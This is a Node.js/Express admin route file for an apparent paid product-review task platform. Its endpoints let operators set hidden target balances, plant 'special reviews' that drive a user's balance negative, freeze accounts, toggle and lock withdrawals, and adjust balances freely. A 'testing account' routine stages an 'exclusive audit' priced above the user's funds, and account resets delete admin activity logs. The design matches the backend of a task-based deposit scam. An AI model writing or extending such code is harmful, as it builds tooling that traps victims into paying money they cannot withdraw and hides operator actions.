// backend/routes/admin.js
const express = require('express');
const router = express.Router();
const { adminMiddleware, superAdminMiddleware } = require('../middleware/auth');
const { logActivity } = require('../middleware/activityLogger');
const User = require('../models/User');
const Product = require('../models/Product');
const Withdrawal = require('../models/Withdrawal');
const Review = require('../models/Review');
const AdminActivity = require('../models/AdminActivity');
const LEVELS = require('../config/levels');

// Get all users
router.get('/users', adminMiddleware, async (req, res) => {
  try {
    const users = await User.find().select('-password').sort({ createdAt: -1 });
    res.json(users);
  } catch (err) {
    console.error('Error fetching users:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Clear target balance for a user
router.post('/users/:userId/clear-target-balance', adminMiddleware, async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Remove target balance restriction
    user.targetBalance = null;

    await user.save();

    res.json({
      message: 'Target balance cleared successfully. User can now proceed normally.',
      user: {
        username: user.username,
        targetBalance: user.targetBalance
      }
    });
  } catch (err) {
    console.error('Error clearing target balance:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Set target balance for a user
router.post('/users/:userId/target-balance', adminMiddleware, logActivity('target_balance'), async (req, res) => {
  try {
    // Check permission for sub-admins
    if (req.admin.role === 'subadmin' && !req.admin.permissions?.canSetTargetBalance) {
      return res.status(403).json({ message: 'Access denied. You do not have permission to set target balance.' });
    }

    const { targetBalance } = req.body;
    const user = await User.findById(req.params.userId);

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Store username for activity logging
    req.body.targetUsername = user.username;

    user.targetBalance = targetBalance;
    await user.save();

    res.json({
      message: 'Target balance set successfully',
      targetBalance: user.targetBalance
    });
  } catch (err) {
    console.error('Error setting target balance:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Search users
router.get('/users/search', adminMiddleware, async (req, res) => {
  try {
    const { query } = req.query;
    const users = await User.find({
      $or: [
        { username: { $regex: query, $options: 'i' } },
        { email: { $regex: query, $options: 'i' } }
      ]
    }).select('-password');

    res.json(users);
  } catch (err) {
    console.error('Error searching users:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get user details
router.get('/users/:userId', adminMiddleware, async (req, res) => {
  try {
    const user = await User.findById(req.params.userId).select('-password');
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }
    res.json(user);
  } catch (err) {
    console.error('Error fetching user details:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Update user
router.put('/users/:userId', adminMiddleware, logActivity('group_link'), async (req, res) => {
  try {
    const updates = req.body;
    console.log('Updating user', req.params.userId, 'with:', updates);

    // For sub-admins, only allow groupLink updates if they have permission
    if (req.admin.role === 'subadmin') {
      // Check if trying to update groupLink
      if (updates.groupLink !== undefined) {
        if (!req.admin.permissions?.canEditGroupLinks) {
          return res.status(403).json({ message: 'Access denied. You do not have permission to edit group links.' });
        }
        // Only allow groupLink update for sub-admins
        const allowedUpdates = { groupLink: updates.groupLink };
        Object.keys(updates).forEach(key => {
          if (key !== 'groupLink') {
            delete updates[key];
          }
        });
      } else {
        return res.status(403).json({ message: 'Access denied. Sub-admins can only update group links.' });
      }
    }

    // Check if level is being updated (super admin only)
    if (updates.level && LEVELS[updates.level]) {
      const existingUser = await User.findById(req.params.userId);
      if (existingUser && existingUser.level !== updates.level) {
        // Only update totalReviewsAssigned if it matches the current level's default
        // This preserves manual overrides if the user was already at a custom count
        const currentLevelDefault = LEVELS[existingUser.level].totalReviews;
        if (existingUser.totalReviewsAssigned === currentLevelDefault) {
          updates.totalReviewsAssigned = LEVELS[updates.level].totalReviews;
        }
      }
    }

    const user = await User.findByIdAndUpdate(
      req.params.userId,
      updates,
      { new: true }
    ).select('-password');

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Store username for activity logging
    req.body.targetUsername = user.username;

    res.json(user);
  } catch (err) {
    console.error('Error updating user:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Adjust balance
router.post('/users/:userId/balance', adminMiddleware, logActivity('balance_adjust'), async (req, res) => {
  try {
    // Check permission for sub-admins
    if (req.admin.role === 'subadmin' && !req.admin.permissions?.canAdjustBalance) {
      return res.status(403).json({ message: 'Access denied. You do not have permission to adjust balance.' });
    }

    const { amount, operation } = req.body;
    const user = await User.findById(req.params.userId);

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Store username for activity logging
    req.body.targetUsername = user.username;

    if (operation === 'add') {
      user.accountBalance += parseFloat(amount);
    } else if (operation === 'subtract') {
      user.accountBalance -= parseFloat(amount);
    }

    await user.save();

    res.json({
      message: `Balance ${operation === 'add' ? 'added' : 'subtracted'} successfully`,
      newBalance: user.accountBalance
    });
  } catch (err) {
    console.error('Error adjusting balance:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Assign special review with negative balance logic
router.post('/users/:userId/special-review', adminMiddleware, logActivity('special_review'), async (req, res) => {
  try {
    // Check permission for sub-admins
    if (req.admin.role === 'subadmin' && !req.admin.permissions?.canAssignSpecialReviews) {
      return res.status(403).json({ message: 'Access denied. You do not have permission to assign special reviews.' });
    }

    const { position, productId, negativeAmount } = req.body;

    // Validate inputs
    if (!position || !productId || negativeAmount === undefined) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Store username for activity logging
    req.body.targetUsername = user.username;

    // Check if product exists
    const product = await Product.findById(productId);
    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }

    // Remove existing special review at this position if any
    user.specialReviews = user.specialReviews.filter(sr => sr.position !== parseInt(position));

    // Add new special review
    user.specialReviews.push({
      position: parseInt(position),
      productId,
      negativeAmount: parseFloat(negativeAmount)
    });

    await user.save();

    res.json({
      message: 'Special review added successfully',
      specialReview: {
        position,
        productId,
        negativeAmount: parseFloat(negativeAmount)
      }
    });
  } catch (err) {
    console.error('Error assigning special review:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Toggle freeze (super admin only)
router.post('/users/:userId/freeze', superAdminMiddleware, async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    user.isFrozen = !user.isFrozen;
    await user.save();

    res.json({
      message: `User ${user.isFrozen ? 'frozen' : 'unfrozen'} successfully`,
      isFrozen: user.isFrozen
    });
  } catch (err) {
    console.error('Error toggling freeze:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Reset account (super admin only - does NOT give $15 bonus)
router.post('/users/:userId/reset', superAdminMiddleware, async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    user.accountBalance = 0;
    user.reviewsCompleted = 0;
    user.currentReviewPosition = 0;
    user.currentSessionCommission = 0;
    user.pendingReview = {};
    user.specialReviews = [];
    user.targetBalance = null;

    // Clear related history
    await Review.deleteMany({ userId: req.params.userId });
    await AdminActivity.deleteMany({ targetUserId: req.params.userId });

    await user.save();

    res.json({ message: 'Account reset successfully' });
  } catch (err) {
    console.error('Error resetting account:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Set user as testing account (super admin only)
router.post('/users/:userId/set-testing', superAdminMiddleware, async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    user.isTestingAccount = true;
    user.accountBalance = 525; // $510 credit + $15 starting
    user.level = 'Beginner';
    user.reviewsCompleted = 0;
    user.currentReviewPosition = 0;
    user.currentSessionCommission = 0;
    user.specialReviews = [];
    user.targetBalance = null;

    // Add exclusive audit at position 20
    // Price will be Current Balance (~$550) + Negative Amount ($450) = $1000
    // Commission = $1000 * 20% = $200
    user.specialReviews.push({
      position: 20,
      productId: '65a7d7b3f1a2b3c4d5e6f7a1',
      negativeAmount: 450
    });

    // Try to find a valid product ID if the hardcoded one isn't ideal
    const firstProduct = await Product.findOne();
    if (firstProduct) {
      user.specialReviews[0].productId = firstProduct._id;
    }

    await user.save();

    res.json({
      message: 'Account set as testing account successfully',
      user: {
        username: user.username,
        accountBalance: user.accountBalance,
        isTestingAccount: user.isTestingAccount
      }
    });
  } catch (err) {
    console.error('Error setting testing account:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Toggle withdrawal (super admin only)
router.post('/users/:userId/toggle-withdrawal', superAdminMiddleware, async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    user.canWithdraw = !user.canWithdraw;
    await user.save();

    res.json({
      message: `Withdrawal ${user.canWithdraw ? 'enabled' : 'disabled'} successfully`,
      canWithdraw: user.canWithdraw
    });
  } catch (err) {
    console.error('Error toggling withdrawal:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Unlock withdrawal details (super admin only)
router.post('/users/:userId/unlock-withdrawal', superAdminMiddleware, async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    if (user.withdrawalInfo) {
      user.withdrawalInfo.isLocked = false;
    }

    await user.save();

    res.json({ message: 'Withdrawal details unlocked successfully' });
  } catch (err) {
    console.error('Error unlocking withdrawal details:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Change user password (super admin only)
router.post('/users/:userId/change-password', superAdminMiddleware, async (req, res) => {
  try {
    const { newPassword } = req.body;
    const user = await User.findById(req.params.userId);

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    const bcrypt = require('bcryptjs');
    const salt = await bcrypt.genSalt(10);
    user.password = await bcrypt.hash(newPassword, salt);
    await user.save();

    res.json({ message: 'Password changed successfully' });
  } catch (err) {
    console.error('Error changing password:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get all products (super admin only)
router.get('/products', superAdminMiddleware, async (req, res) => {
  try {
    const products = await Product.find().sort({ createdAt: -1 });
    res.json(products);
  } catch (err) {
    console.error('Error fetching products:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Add product (super admin only)
router.post('/products', superAdminMiddleware, async (req, res) => {
  try {
    const product = new Product(req.body);
    await product.save();
    res.status(201).json(product);
  } catch (err) {
    console.error('Error adding product:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Update product (super admin only)
router.put('/products/:productId', superAdminMiddleware, async (req, res) => {
  try {
    const product = await Product.findByIdAndUpdate(
      req.params.productId,
      req.body,
      { new: true }
    );
    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }
    res.json(product);
  } catch (err) {
    console.error('Error updating product:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Delete product (super admin only)
router.delete('/products/:productId', superAdminMiddleware, async (req, res) => {
  try {
    const product = await Product.findByIdAndDelete(req.params.productId);
    if (!product) {
      return res.status(404).json({ message: 'Product not found' });
    }
    res.json({ message: 'Product deleted successfully', productId: req.params.productId });
  } catch (err) {
    console.error('Error deleting product:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get all withdrawals (super admin only)
router.get('/withdrawals', superAdminMiddleware, async (req, res) => {
  try {
    const withdrawals = await Withdrawal.find()
      .populate('userId', 'username email')
      .sort({ requestedAt: -1 });
    res.json(withdrawals);
  } catch (err) {
    console.error('Error fetching withdrawals:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get user withdrawals (read-only for sub-admins with permission)
router.get('/users/:userId/withdrawals', adminMiddleware, async (req, res) => {
  try {
    // Check permission for sub-admins
    if (req.admin.role === 'subadmin' && !req.admin.permissions?.canViewWithdrawalHistory) {
      return res.status(403).json({ message: 'Access denied. You do not have permission to view withdrawal history.' });
    }

    const withdrawals = await Withdrawal.find({ userId: req.params.userId })
      .sort({ requestedAt: -1 });
    res.json(withdrawals);
  } catch (err) {
    console.error('Error fetching user withdrawals:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Update withdrawal (super admin only)
router.put('/withdrawals/:withdrawalId', superAdminMiddleware, async (req, res) => {
  try {
    const { status, adminNotes } = req.body;
    const withdrawal = await Withdrawal.findByIdAndUpdate(
      req.params.withdrawalId,
      {
        status,
        adminNotes,
        processedAt: status !== 'pending' ? new Date() : null
      },
      { new: true }
    );

    if (!withdrawal) {
      return res.status(404).json({ message: 'Withdrawal not found' });
    }

    // If cancelled, refund the user
    if (status === 'cancelled' || status === 'rejected') {
      const user = await User.findById(withdrawal.userId);
      if (user) {
        user.accountBalance += withdrawal.amount;
        // Restore commission if available
        if (withdrawal.commissionSnapshot) {
          user.currentSessionCommission = withdrawal.commissionSnapshot;
        }
        await user.save();
        console.log(`Refunded ${withdrawal.amount} to user ${user.username} (cancelled withdrawal)`);
      }
    }

    if (!withdrawal) {
      return res.status(404).json({ message: 'Withdrawal not found' });
    }

    res.json(withdrawal);
  } catch (err) {
    console.error('Error updating withdrawal:', err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Get all reviews with product price
router.get('/reviews', adminMiddleware, async (req, res) => {
  try {
    const reviews = await Review.find()
      .populate('userId', 'username email')
      .populate('productId', 'name')
      .sort({ createdAt: -1 });

    // Format reviews to include all necessary info
    const formattedReviews = reviews.map(review => ({
      _id: review._id,
      username: review.userId?.username,
      productName: review.productId?.name,
      productPrice: review.productPrice, // Include product price
      commission: review.commission,
      uniqueCode: review.uniqueCode,
      status: review.status,
      isSpecial: review.isSpecial,
      reviewPosition: review.reviewPosition,
      createdAt: review.createdAt,
      completedAt: review.completedAt
    }));

    res.json(formattedReviews);
  } catch (err) {
    console.error('Error fetching reviews:', err);
    res.status(500).json({ message: 'Server error' });
  }
});
router.post('/users/:userId/update-reviews', adminMiddleware, async (req, res) => {
  try {
    const { totalReviewsAssigned } = req.body;
    const user = await User.findById(req.params.userId);

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    if (!totalReviewsAssigned || totalReviewsAssigned < 1) {
      return res.status(400).json({ message: 'Total reviews must be at least 1' });
    }

    // Update total reviews - this only affects future progress
    user.totalReviewsAssigned = parseInt(totalReviewsAssigned);
    await user.save();

    res.json({
      message: 'Total reviews updated successfully. This will affect future reviews only.',
      totalReviewsAssigned: user.totalReviewsAssigned,
      reviewsCompleted: user.reviewsCompleted,
      reviewsRemaining: user.totalReviewsAssigned - user.reviewsCompleted
    });
  } catch (err) {
    console.error('Error updating total reviews:', err);
    res.status(500).json({ message: 'Server error' });
  }
});
module.exports = router;